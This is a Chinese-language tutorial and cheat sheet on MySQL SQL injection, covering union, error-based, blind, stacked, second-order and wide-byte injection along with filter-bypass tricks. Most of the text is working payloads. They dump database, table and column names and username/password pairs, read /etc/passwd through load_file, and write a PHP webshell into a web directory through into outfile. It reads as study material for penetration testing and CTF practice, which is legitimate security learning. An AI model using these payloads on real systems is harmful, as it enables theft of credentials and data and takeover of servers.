# SQL注入



## 前言
SQL注入是最常见的一种web漏洞，在未过滤完善的情况下，用户通过构造恶意的SQL语句并提交到web应用，欺骗服务器让其执行，造成数据泄露、植入webshell等。以下以mysql为例，其他数据库注入方式大同小异。

## 分类
**基于注入值类型**
- 数字型
- 字符型

**基于注入请求方式**
- GET型
- POST型
- HTTP头型（cookie、X-Forwared-For等）

**基于注入方式**
- 联合注入
- 报错注入
- 堆叠注入
- 盲注
- 万能密码
- 宽字节注入
- 二次注入
- DNSlog注入
- ...

<br/>

## 常用函数

<style>
table th:first-of-type{
    width:420px;//设置表格宽度
}
</style>
|函数|功能|
|---|----|
| user() | 用户名 |
| current_user() | 当前用户名 |
| database() | 当前数据库名 |
| version() | 数据库版本 |
| @@datadir | 数据库路径 |
| @@basedir | 数据库安装路径 |
| @@version_compile_os | 操作系统 |
| count() | 返回表中的记录数 |
| concat() | 将多个字符串连接成一个字符串 |
| group_concat() | 连接一个组的所有字符串，并以逗号分隔每一条数据 |
| concat_ws() | 含有分隔符地连接字符串 |
| load_file | 读取本地文件 |
| into outfile | 写入文件 |
| length() | 返回字符串长度 |
| ascii() | 字符转化成ascii码 |
| ord() | 字符转换成ascii码 |
| mid() | 字段的截取 |
| substr()	| 字段的截取 |
| left() | 从左开始截取字符串|
| right() | 从右开始截取字符串 |
| floor() | 返回小于 x 的最大整数值 |
| rand() | 0和1之间产生一个随机数|
| extractvalue() | 对XML文档进行查询的函数 |
| updatexml() | 改变文档中符合条件的节点的值 |
| sleep() |  休眠 |
| if()	| 判断语句 |

<br/>

## mysql版本区别
在mysql5.0以上自带了一个数据库 `INFORMATION_SCHEMA`，它提供了访问数据库元数据的方式。什么是元数据？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。我们着重关注这三张表

- `SCHEMATA表`：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
- `TABLES表`：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
- `COLUMNS表`：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

有了这三张表就可以获取任意数据库中的任意表的数据，而在mysql5.0以下没有该库，因此只能靠爆破数据库信息。
<br/>


## 联合注入
当执行SQL语句查询，数据会发生回显到页面，就可以使用联合注入。联合注入需要确定字段的数量，因为`union`函数需要相同的字段才能执行，可以用`order by n`来确定字段数量，通过改变n的大小来判断字段数量，n小于等于字段页面正常，如果大于字段数量则报错

确定完字段数量之后，需要确定显示位，可以用`id=-1 union select 1,2,....,n`来确定显示位。
获得字段数量和显示位就可以进行联合注入，payload如下
```sql
union select 1,2,...,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA --+ 获取全部数据库名

union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 获取当前数据库的表名

union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users' --+  获取获取表的字段

union select 1,2,...,group_concat(username,password) from users --+ 获取数据
```
<br/>

## 报错注入
报错注入是通过特殊函数在人为造成错误情况下，在输出错误结果的同时获取我们想要的信息，报错注入可以分为这几大类

- BingInt等数据溢出
- 函数参数格式错误
- 主键/字段重复
<br/>


### updatexml
`UPDATEXML (XML_document, XPath_string, new_value); `  作用：改变文档中符合条件的节点的值
适用版本: 5.1.5+
原理：因为0x7e为`~`不是xml格式的语法，导致程序出现报错，利用错误提示来获取我们想要的信息。但是限制最大长度为32
```sql
updatexml(1,concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),0x7e),1) --+ 获取全部数据库名

updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+ 获取当前数据库的表名

updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+ 获取获取表的字段

updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) --+ 获取数据
```

### extractvalue
`EXTRACTVALUE (XML_document, XPath_string)`  作用：对XML文档进行查询的函数
适用版本: 5.1.5+
原理同updatexml一样，同样限制最大长度为32
```sql
extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))) --+ 获取全部数据库名

extractvalue(1,concat(0x7e,(select%20 group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ 暴露数据库名

extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+ 获取获取表的字段

extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) --+ 获取数据
```

### floor
floor(),count(),group by()函数一起使用会冲突导致报错
```sql
select * from users where id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);  --+获取数据库名

select * from users where id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); --+ 获取表名

select * from users where id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); --+ 获取表的字段

select * from users where id=1 and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); --+ 获取数据
```

### exp
`exp(int)` 作用：该函数回返回e的x次方结果
适用版本：5.5.5~5.5.49
次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错，当传递一个大于709的值时，函数exp()就会引起一个重叠错误。
`ln`函数和`log`函数都是返回以e为底数的对数，可以用`exp`和`ln/log`进行数据的换算，从而获取我们想要的信息
```sql
select exp(~(select * from(select database())a));

select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)) --+ 获取获取表的字段

select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)) --+ 获取获取表的字段

select exp(~ (select*from(select concat_ws(':',username, password) from users limit 0,1)x)) --+ 获取数据

select exp(~(select*from(select load_file('/etc/passwd'))a)) --+ 读取文件
```
注：a或x可以是任意的字母，代表的是查询返回的值组成一个集合，这个集合的名字为a或x或其他。`~`代表取反符号，过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据

### name_const
mysql列名重复会报错，但是只能获取数据库版本信息
```sql
select * from(select name_const(version(),0x1),name_const(version(),0x1))a
```

### 几何函数
```sql
GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))
polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))
multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))
multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))
linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))
multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))
```

###  join
适用版本： 5.5.49+ 
通过系统关键词join可建立两个表之间的内连接。
通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。
并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。
```sql
mysql> select * from(select * from users a join (select * from users)b)c;
mysql> select * from(select * from users a join (select * from users)b using(username))c;
mysql> select * from(select * from users a join (select * from users)b using(username,password))c
```


### GTID相关函数
适用版本： 5.6.5+ 
参数格式不正确导致出现错误
```sql
mysql> select gtid_subset(user(),1);
mysql> select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);
mysql> select gtid_subtract((select * from(select user())a),1);
```

### UUID相关函数
适用版本：8.0.x
参数格式不正确。
```sql
mysql> SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));
mysql> SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));
```


### 报错函数速查表

注：默认MYSQL_ERRMSG_SIZE=512

| 类别 | 函数 | 版本 | 5.5.x | 5.6.x | 5.7.x | 8.x | 显错长度 | 报错内容长度 | 额外限制 |
|------|-----|----------|------|-------|--------|------|-----------|--------------|----------|
| 主键重复|	floor round	| ❓ | ✔️ |✔️  |    ✔️  |     | 64          |         | data_type ≠ varchar |
|列名重复| name_const| ❓ |  ✔️ |     ✔️ |✔️ |   ✔️  |            |         | only version() |
|列名重复| join	 | [5.5.49, ?)| ✔️	 |✔️	|✔️	 |✔️	|       |        |      only columns |
| 数据溢出 - Double	| 1e308 cot exp pow	|[5.5.5, 5.5.48]|✔️| | | | | MYSQL_ERRMSG_SIZE | |
| 数据溢出 - BIGINT	| 1+~0 | [5.5.5, 5.5.48] | ✔️| | | | | MYSQL_ERRMSG_SIZE |  |
| 几何对象	| geometrycollection linestring multipoint multipolygon multilinestring polygon	| [?, 5.5.48] | ✔️	| | | |244 | |
空间函数 Geohash | ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash	|  [5.7, ?)	| | |  ✔️ | ✔️	| 128 | | |
|GTID	| gtid_subset gtid_subtract	| [5.6.5, ?) | | ✔️	|✔️	|✔️	 |200| | |
|JSON	| json_*	| [5.7.8, 5.7.11]	| | | ✔️| | 200| | |
|UUID| uuid_to_bin bin_to_uuid	| [8.0, ?)	| | | | ✔️	| 128| | |
|XPath | extractvalue updatexml	| [5.1.5, ?)	| ✔️| ✔️| ✔️| ✔️ | 32 | | |

以上来源：[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169#toc-28)
<br/>

## 盲注
盲注分为两种：布尔盲注和时间盲注。当页面没有回显时，可以使用盲注来获取数据。但是盲注是一个字一个字的进行判断，比较消耗时间，所以需要编写二分法的脚本加快获取数据的速度，如果是时间盲注则需要额外的时间来判断。

### 布尔盲注
当提交的数据出现正确或错误两种不同的页面时，就可以采用布尔盲注。根据页面返回情况和匹配数据的每个字符的ascii码，逐个将信息破解
相关函数：
- ascii() 字符转化成ascii码
- substr() 字段的截取
- length() 返回字符串长度

```sql
ascii(substr(database(),1,1))>114  --+ 判断数据库第一个字符的ascill码是否大于114

ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+ 判断该表的第一个字符是否大于100

ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>120 --+ 判断users表中第一个字段的第一个字符是否大于120

ascii(substr(( select password from users limit 0,1),1,1))>68 --+ 判断password的第一个字符是否大于68
```

### 时间盲注
当页面只有一个回显结果时，可以采用时间盲注，通过页面的响应时间来判断
可以进行延时的函数有:`sleep`、`benchmark`、`get_lock`，还有笛卡尔积等
payload和布尔盲注基本一致，只是多了一个条件来判断延时 `if(expr1,expr2,expr3)`

```sql
if(length(database())>5,sleep(3),1)  --+ 数据库名大于5则休眠3秒

if((ascii(substr(database(),1,1)))>120,sleep(3),1) --+ 数据库第一个字符大于120则休眠3秒

if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>120,sleep(3),1)--+ 获取表名

if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))>100,sleep(3),1)--+ 获取列名

if((ascii(substr(( select password from users limit 0,1),1,1)))>1,sleep(3),1)--+  获取密码

```
<br/>

## 堆叠注入
因为`;`是sql语句的结束符，在支持多语句执行的情况下，可以在后面添加其他sql语句并让其执行。但是堆叠注入存在局限性，可能受到API、数据库引擎不支持的限制或者权限不足等。
在php中，`mysqli_query`只能执行一次查询，不支持堆叠，而`mysqli_multi_query`允许多次查询，支持堆叠。
```sql
mysql> select @@version ; select user();
+-----------+
| @@version |
+-----------+
| 8.0.12    |
+-----------+
1 row in set (0.01 sec)

+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```
<br/>

## 二次注入
当用户构造的恶意语句存储在数据库中，如果再次从数据库中取出这个“脏数据”使用，那么就可能会产生二次注入
![](/SQL注入.assets/二次注入.png)

现在以sqli-lab/Less24为例
```sql
#登入用户
$username = mysql_real_escape_string($_POST["login_user"]);
$password = mysql_real_escape_string($_POST["login_password"]);
SELECT * FROM users WHERE username='$username' and password='$password'

#修改密码
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```

现在让$username=`admin'#`，$username会受到`mysql_real_escape_string`的转义变成`admin\'#`，但是数据进入数据库中仍然还是`admin'#`。当执行修改密码操作时，会执行修改密码的sql语句，但是$username已经被污染了，最终执行的sql语句变成
```sql
UPDATE users SET PASSWORD='$pass' where username='admin' #' and password='$curr_pass'
```
通过用户`admin'#`，将真正的admin的密码修改
<br/>

## 宽字节注入
宽字节注入实际上是编码转化的问题。当数据库设置为`gbk`时就会产生一个编码问题，因为`gbk`会将两个字符识别成一个汉字，当开启了`addslashes`函数或者引号被转义就可以利用这点让引号成功逃逸。
以下面代码为例
```php
$conn->query("set names 'gbk';"); //存在宽字节注入
$id = addslashes(@$_GET['id']);
$sql = "select * from users where id = '$id' ;";
```
当我们提交`id=1' and 1=1 %23` 会被`addslashes`转义成`1\' and 1=1 #`，因为引号被转义，无法闭合sql语句
```sql
select * from users where id ='1\' and 1=1 #
```
而我们提交`id=1%df' and 1=1 %23`，经过gkb编码之后就变成了`id=1運' and 1=1 #` 这样就成功让引号逃逸。此时sql语句就可以成功执行
```sql
select * from users where id ='1運' and 1=1 #
```
因为`%df%27`经过addslashes函数变成了 `%df\'`，而`%df%5c`经过gbk变成`運`，这样就可以让`%27`逃逸
注：`'`的URL编码为`%27`，`\`的URL编码为`%5c`
<br/>


## 读/写 文件
mysql可以对文件进行读写，但是存在限制。`secure_file_priv`是一个系统变量，用来限制文件的读/写权限，该变量有三个参数分别对应不同的结果
- 无内容：没有限制
- NULL：禁止文件读/写
- 目录：只能对该目录的文件进行读/写

可以用`show global variables like 'secure_file_priv';`查看该值的内容
```sql
mysql> show global variables like 'secure_file_priv';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
1 row in set, 1 warning (0.01 sec)
```
注：该变量在mysql的5.5.53之后的版本默认为null，之前版本则为无内容。可以通过修改my.ini改变该值

### 读文件
如果该值为空或者指定目录就可以进行文件的读取，利用`load_file`函数对文件进读取操作
```sql
mysql> select load_file('D:\\phpstudy_pro\\WWW\\flag.txt');
+----------------------------------------------+
| load_file('D:\\phpstudy_pro\\WWW\\flag.txt') |
+----------------------------------------------+
| flag{test_233}                               |
+----------------------------------------------+
1 row in set (0.00 sec)
```
限制：需要知道要读取的文件所在的绝对路径，同时读取文件大小必须不能超过`max_allowed_packet`的值

### 写文件
利用`into outfile`函数对文件进行写入操作
```sql
mysql> select "<?php @assert($_GET['cmd']);?>" into outfile 'D:\\phpstudy_pro\\www\\shell.php';
Query OK, 1 row affected (0.00 sec)
```
限制：`into outfile`无法覆盖文件，同时需要文件有写权限

<br/>

## 绕过姿势
- 大小写绕过
mysql对大小写不敏感，所以可以用大小写进行绕过（`And`，`ANd`，`aND`...）

- 双写绕过
当后台只是将输入的字符替换成空的时候就可以用双写进行绕过（`selecselectt`，`uniounionn`）

- 编码绕过
可以用十六进制、ascii码进行绕过

- 空格绕过
`+`，`%09`，`%0a`，`%0b`，括号`()`，内联注释`/**/`
```sql
?id=1+and+1=1+%23
?id=1%0Aand%0A1=1%0A%23
select(table_name)from(information_schema.tables)where(table_schema)=database()
id=1 /*!and*/ 1=1
?id=(1)and(1)=(1)%23
```

- 等价替换
用功能类似的函数或者方法来进行绕过
`and` -> `&&`
`or` -> `||` 
`=` -> `like`，`REGEXP`，`not < and not >`，`RLIKE`
`> X` -> `not between 0 and X`
`WHERE` -> `HAVING`
`NOT` -> `!`
`id=2` -> `id > 1 and id < 3`
`ID=1` -> `!(ID <> 1)`

- 逗号过滤
```sql
LIMIT 0,1  -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4  -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
SUBSTR('KAIBRO',1,1) => SUBSTR('KAIBRO' FROM 1 FOR 1)
```

- 过滤大小于号
`greatest(n1,n2,n3…)`返回n中的最大值
`least(n1,n2,n3…)`:返回n中的最小值
`between a and b`:范围在a-b之间


- 过滤引号
十六进制编码
`select column_name  from information_schema.tables where table_name=0x7573657273;`
ASCII码
`SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110)`
宽字节


- 函数绕过
`sleep()` -> `benchmark()`
`ascii()` –>`ord` 注：处理英文返回值一样，但是处理中文等返回值不一样
`group_concat()` –> `concat_ws()`
`substr()`,`substring()`,`mid()`可以相互取代, 取子串的函数还有`left()`,`right()`


- md5绕过
来自实验吧的一题，虽然靶场已经关了很久
```sql
$sql = "SELECT * FROM admin WHERE pass ='".md5($password,true)."'";
```
利用`ffifdyop`进行绕过，因为该字符经过md5加密后会变成 `or'6�]��!r,��b`，从而进行绕过，最终拼接的sql为
```sql
$sql="select password from users where password=''or'6<xxx>'"
```

<br/>

## Trick
### 无列名注入
在不知道列名的情况下可以使用无列名注入。原理：在不知道列名的情况下，通过给列名用取别名的同时，将别名进行数据查询。

正常查询，可以看到student表中有id，name，gender 三个列
```sql
mysql> select * from student;
+------+-------+--------+
| id   | name  | gender |
+------+-------+--------+
|    1 | root  |      1 |
|    2 | admin |      1 |
|    3 | guest |      0 |
+------+-------+--------+
3 rows in set (0.00 sec)
```
通过union将两个表联合，数字1，2，3分别和student的列名一一对应
```sql
mysql> select 1,2,3 union select * from student;
+------+-------+------+
| 1    | 2     | 3    |
+------+-------+------+
|    1 | 2     |    3 |
|    1 | root  |    1 |
|    2 | admin |    1 |
|    3 | guest |    0 |
+------+-------+------+
4 rows in set (0.00 sec)
```
继续用数字对应列名，并且用`a`这个别名替代之前的查询内容，就可以实现无列名注入
```sql
mysql> select `2`  from (select 1,2,3 union select * from student) a;
+-------+
| 2     |
+-------+
| 2     |
| root  |
| admin |
| guest |
+-------+
4 rows in set (0.00 sec)
```
如果反引号 \` \` 被禁用可以用其他字母来代替
```sql
mysql> select b  from (select 1,2 as b,3 union select * from student) a;
+-------+
| b     |
+-------+
| 2     |
| root  |
| admin |
| guest |
+-------+
4 rows in set (0.06 sec)
```

<br/>

## 参考

[sql注入笔记](https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/)

https://xz.aliyun.com/t/7169

https://blog.csdn.net/JBlock/article/details/88044293





